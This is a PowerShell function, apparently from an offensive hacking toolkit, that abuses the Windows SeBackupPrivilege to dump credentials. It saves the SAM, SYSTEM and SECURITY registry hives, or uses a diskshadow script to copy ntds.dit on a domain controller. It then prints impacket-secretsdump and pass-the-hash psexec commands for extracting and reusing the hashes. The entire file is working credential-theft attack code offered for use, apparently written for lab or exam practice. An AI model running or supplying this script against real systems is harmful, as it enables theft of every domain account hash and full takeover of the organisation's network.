function Invoke-SeBackupAbuse {
<#
.SYNOPSIS
    Abuses SeBackupPrivilege to dump credential hives or ntds.dit.

.DESCRIPTION
    SeBackupPrivilege allows reading any file regardless of ACL.
    Two paths:
      - Local  : dump SAM + SYSTEM + SECURITY -> extract local hashes (any Windows)
      - DC     : use diskshadow to copy ntds.dit -> dump ALL domain hashes

    After dumping, run from Kali:
      impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
      impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

.EXAMPLE
    # Local hive dump (any machine)
    Invoke-SeBackupAbuse -Mode local -OutPath C:\tmp

.EXAMPLE
    # DC ntds.dit dump (domain controller only)
    Invoke-SeBackupAbuse -Mode dc -OutPath C:\tmp

.NOTES
    vajra / hacktrack toolkit
    Credits: @gtworek/Priv2Admin, various
#>
    param(
        [Parameter(Mandatory=$false)]
        [ValidateSet("local","dc")]
        [string]$Mode = "local",

        [Parameter(Mandatory=$false)]
        [string]$OutPath = "C:\tmp"
    )

    # ── Verify privilege is present ──────────────────────────────────────────────
    $privs = (whoami /priv) -join " "
    if ($privs -notmatch "SeBackupPrivilege") {
        Write-Output "[-] SeBackupPrivilege not found in current token. Check whoami /priv."
        return
    }
    Write-Output "[+] SeBackupPrivilege detected"

    # ── Ensure output directory exists ───────────────────────────────────────────
    if (!(Test-Path $OutPath)) {
        New-Item -ItemType Directory -Path $OutPath -Force | Out-Null
    }

    if ($Mode -eq "local") {
        # ── LOCAL MODE: dump SAM + SYSTEM + SECURITY ─────────────────────────────
        Write-Output "[*] Mode: LOCAL — dumping SAM, SYSTEM, SECURITY hives"
        Write-Output "[*] Output: $OutPath"

        $hives = @{
            "SAM"      = "HKLM\SAM"
            "SYSTEM"   = "HKLM\SYSTEM"
            "SECURITY" = "HKLM\SECURITY"
        }

        foreach ($name in $hives.Keys) {
            $dest = Join-Path $OutPath $name
            Write-Output "[*] Saving $($hives[$name]) -> $dest"
            $result = & reg save $hives[$name] $dest /y 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-Output "[+] $name saved"
            } else {
                Write-Output "[-] Failed to save $name : $result"
            }
        }

        Write-Output ""
        Write-Output "[+] Done. Transfer files to Kali, then:"
        Write-Output "    impacket-secretsdump -sam $OutPath\SAM -system $OutPath\SYSTEM -security $OutPath\SECURITY LOCAL"
        Write-Output ""
        Write-Output "[*] With the Administrator hash, PTH:"
        Write-Output "    impacket-psexec -hashes :NTHASH 'DOMAIN/Administrator'@TARGET_IP"

    } elseif ($Mode -eq "dc") {
        # ── DC MODE: diskshadow + robocopy to copy ntds.dit ──────────────────────
        Write-Output "[*] Mode: DC — diskshadow ntds.dit + SYSTEM hive"
        Write-Output "[*] Output: $OutPath"

        # Write diskshadow script
        $shadowScript = @"
set context persistent nowriters
add volume c: alias hackme
create
expose %hackme% z:
exec C:\Windows\System32\cmd.exe /c robocopy /B z:\Windows\NTDS\ $OutPath ntds.dit
delete shadows volume %hackme%
reset
"@
        $scriptPath = Join-Path $OutPath "shadow.dsh"
        $shadowScript | Out-File $scriptPath -Encoding ASCII
        Write-Output "[*] Diskshadow script written to $scriptPath"

        # Run diskshadow
        Write-Output "[*] Running diskshadow..."
        & diskshadow /s $scriptPath

        # Also dump SYSTEM hive (needed to decrypt ntds.dit)
        $sysPath = Join-Path $OutPath "SYSTEM"
        Write-Output "[*] Saving SYSTEM hive -> $sysPath"
        & reg save HKLM\SYSTEM $sysPath /y

        Write-Output ""
        Write-Output "[+] Done. Transfer ntds.dit and SYSTEM to Kali, then:"
        Write-Output "    impacket-secretsdump -ntds $OutPath\ntds.dit -system $OutPath\SYSTEM LOCAL"
        Write-Output ""
        Write-Output "[*] This dumps ALL domain account hashes including krbtgt and Administrator."
        Write-Output "[*] PTH as Administrator -> proof.txt"
    }
}
